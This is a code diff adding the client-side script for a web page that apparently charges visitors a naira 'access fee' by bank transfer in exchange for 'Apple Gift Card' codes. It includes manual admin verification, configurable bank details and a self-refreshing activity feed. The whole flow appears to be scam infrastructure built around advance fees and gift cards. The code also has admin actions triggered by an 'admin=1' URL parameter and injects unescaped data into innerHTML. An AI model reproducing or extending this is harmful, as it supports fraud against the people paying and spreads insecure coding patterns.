+          cardAmount: document.getElementById('card-amount-setting').value,
+          accessFee: document.getElementById('access-fee-setting').value,
+          verificationHours: document.getElementById('verification-time-setting').value,
+          primaryColor: primaryColorInput.value,
+          secondaryColor: secondaryColorInput.value,
+          bankName: document.getElementById('bank-name').value,
+          accountNumber: document.getElementById('account-number-setting').value,
+          accountName: document.getElementById('account-name-setting').value
+        };
+        
+        const response = await fetch('', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+          },
+          body: `action=update_settings&${new URLSearchParams(settings).toString()}`
+        });
+        
+        const result = await response.json();
+        if (result.success) {
+          alert('Settings saved! The page will reload to apply changes.');
+          window.location.reload();
+        } else {
+          alert('Failed to save settings');
+        }
+      });
+    }
+
+    // Payment flow
+    payBtn.addEventListener('click', async () => {
+      if (!emailInput.checkValidity()) {
+        emailInput.focus();
+        emailInput.style.borderColor = '#ef4444';
+        setTimeout(() => {
+          emailInput.style.borderColor = '';
+        }, 2000);
+        return;
+      }
+
+      // Show loading
+      payBtn.disabled = true;
+      payBtn.querySelector('.btn-text').textContent = 'Processing...';
+      
+      try {
+        const response = await fetch('', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+          },
+          body: `action=create_payment&email=${encodeURIComponent(emailInput.value)}&reference=${encodeURIComponent(referenceInput.value)}`
+        });
+        
+        const result = await response.json();
+        if (result.success) {
+          currentPaymentId = result.paymentId;
+          payBtn.querySelector('.btn-text').textContent = 'Payment Recorded';
+          payBtn.style.background = '#10b981';
+          
+          // Show status modal after delay
+          setTimeout(() => {
+            showPaymentStatus(result.paymentId);
+          }, 1500);
+        } else {
+          alert(result.message || 'Payment failed');
+          payBtn.disabled = false;
+          payBtn.querySelector('.btn-text').textContent = 'I Have Made the Transfer';
+        }
+      } catch (error) {
+        console.error('Error:', error);
+        alert('An error occurred. Please try again.');
+        payBtn.disabled = false;
+        payBtn.querySelector('.btn-text').textContent = 'I Have Made the Transfer';
+      }
+    });
+
+    async function showPaymentStatus(paymentId) {
+      // Fetch updated payment status
+      const response = await fetch(`?check_payment=${paymentId}`);
+      const payment = await response.json();
+      
+      if (!payment) {
+        alert('Payment not found!');
+        return;
+      }
+      
+      // Update status display
+      if (payment.status === 'verified') {
+        // Show approved status
+        statusIcon.textContent = '✅';
+        statusTitle.textContent = 'Access Granted!';
+        statusMessage.textContent = 'Your payment has been verified. You can now access your Apple Gift Card.';
+        statusBadge.className = 'status-badge status-approved';
+        statusBadge.innerHTML = '<i class="fas fa-check-circle"></i> VERIFIED';
+        
+        // Show card access
+        notificationInfo.style.display = 'none';
+        cardAccess.style.display = 'block';
+        giftCardCode.textContent = payment.giftCardCode;
+        giftCardAmount.textContent = payment.cardAmount;
+      } else {
+        // Show pending status
+        statusIcon.textContent = '⏳';
+        statusTitle.textContent = 'Verification in Progress';
+        statusMessage.textContent = `Your payment is being verified by our support team. This usually takes up to 24 hours.`;
+        statusBadge.className = 'status-badge status-pending';
+        statusBadge.innerHTML = '<i class="fas fa-clock"></i> AWAITING VERIFICATION';
+        notificationInfo.style.display = 'block';
+        cardAccess.style.display = 'none';
+      }
+      
+      statusModal.classList.add('show');
+    }
+
+    // Close modals
+    closeStatusModal.addEventListener('click', () => {
+      statusModal.classList.remove('show');
+    });
+
+    closeStatusBtn.addEventListener('click', () => {
+      statusModal.classList.remove('show');
+    });
+
+    // Card actions
+    viewCardBtn.addEventListener('click', () => {
+      if (currentPaymentId) {
+        giftCardCode.textContent = 'Loading...';
+        
+        // Fetch card code
+        fetch(`?get_card_code=${currentPaymentId}`)
+          .then(response => response.json())
+          .then(data => {
+            if (data.code) {
+              giftCardCode.textContent = data.code;
+              alert('Apple Gift Card code revealed!');
+            }
+          });
+      }
+    });
+
+    copyCardBtn.addEventListener('click', () => {
+      copyToClipboard(giftCardCode.textContent, copyCardBtn);
+    });
+
+    saveCardBtn.addEventListener('click', () => {
+      // Create card image
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+      canvas.width = 800;
+      canvas.height = 450;
+      
+      // Draw background
+      const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
+      gradient.addColorStop(0, '#00b224');
+      gradient.addColorStop(1, '#1ed042');
+      ctx.fillStyle = gradient;
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      
+      // Draw Apple logo
+      ctx.fillStyle = 'white';
+      ctx.font = 'bold 80px Arial';
+      ctx.textAlign = 'center';
+      ctx.fillText('', canvas.width/2, 120);
+      
+      // Draw title
+      ctx.font = 'bold 40px Arial';
+      ctx.fillText('Apple Gift Card', canvas.width/2, 200);
+      
+      // Draw amount
+      ctx.font = 'bold 60px Arial';
+      ctx.fillText(`$${giftCardAmount.textContent}`, canvas.width/2, 280);
+      
+      // Draw code
+      ctx.font = 'bold 36px Courier New';
+      ctx.fillText(giftCardCode.textContent, canvas.width/2, 350);
+      
+      // Draw footer
+      ctx.font = '20px Arial';
+      ctx.fillText('Access verified on: ' + new Date().toLocaleDateString(), canvas.width/2, 400);
+      
+      // Download
+      const link = document.createElement('a');
+      link.download = `apple-gift-card-${currentPaymentId || 'card'}.png`;
+      link.href = canvas.toDataURL('image/png');
+      link.click();
+      
+      alert('Apple Gift Card saved as image!');
+    });
+
+    // Copy buttons
+    copyAccountBtn.addEventListener('click', () => {
+      copyToClipboard(document.getElementById('account-number').textContent, copyAccountBtn);
+    });
+
+    copyNameBtn.addEventListener('click', () => {
+      copyToClipboard(document.getElementById('account-name').textContent, copyNameBtn);
+    });
+
+    // Admin functions
+    function verifyPayment(paymentId) {
+      if (confirm('Verify this payment and grant access to Apple Gift Card?')) {
+        window.location.href = `?action=verify&id=${paymentId}&admin=1`;
+      }
+    }
+
+    function viewPaymentDetails(paymentId) {
+      fetch(`?get_payment_details=${paymentId}`)
+        .then(response => response.json())
+        .then(payment => {
+          if (payment) {
+            alert(`Payment Details:\n\nID: ${payment.id}\nEmail: ${payment.email}\nAccess Fee: ₦${payment.accessFee.toLocaleString()}\nCard Value: $${payment.cardAmount}\nStatus: ${payment.status}\nCreated: ${payment.createdAt}`);
+          }
+        });
+    }
+
+    // Utility functions
+    function copyToClipboard(text, button) {
+      navigator.clipboard.writeText(text).then(() => {
+        const originalHTML = button.innerHTML;
+        button.innerHTML = '<i class="fas fa-check"></i> Copied!';
+        button.classList.add('copied');
+        
+        setTimeout(() => {
+          button.innerHTML = originalHTML;
+          button.classList.remove('copied');
+        }, 2000);
+      });
+    }
+
+    // Close modals on ESC
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape') {
+        [supportModal, statusModal].forEach(modal => {
+          if (modal) modal.classList.remove('show');
+        });
+      }
+    });
+
+    // Close modals when clicking outside
+    [supportModal, statusModal].forEach(modal => {
+      if (modal) {
+        modal.addEventListener('click', (e) => {
+          if (e.target === modal) {
+            modal.classList.remove('show');
+          }
+        });
+      }
+    });
+
+    // Auto-refresh activities every 30 seconds
+    setInterval(() => {
+      // Reload activities section
+      fetch('?get_activities=1')
+        .then(response => response.json())
+        .then(activities => {
+          const activityTrack = document.getElementById('activity-track');
+          if (activityTrack) {
+            activityTrack.innerHTML = activities.map(activity => `
+              <div class="activity-item">
+                <div class="activity-header">
+                  <div class="activity-user">${activity.user}</div>
+                  <div class="activity-time">${activity.time}</div>
+                </div>
+                <div class="activity-text">${activity.action}</div>
+              </div>
+            `).join('');
+          }
+        });
+    }, 30000);
+  </script>
+</body>
+</html>
